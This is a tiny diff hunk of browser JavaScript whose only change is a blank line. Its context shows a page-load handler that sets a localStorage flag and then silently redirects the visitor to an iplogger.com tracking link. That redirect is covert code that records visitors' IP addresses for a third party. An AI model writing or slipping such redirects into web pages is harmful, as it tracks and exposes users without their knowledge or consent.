@@ -5,6 +5,7 @@ window.addEventListener("load", ()=>{
     }else{
         localStorage.setItem("tempVal", 1);
     location.replace("https://iplogger.com/2VEkD5")
+  
     }
 })
 
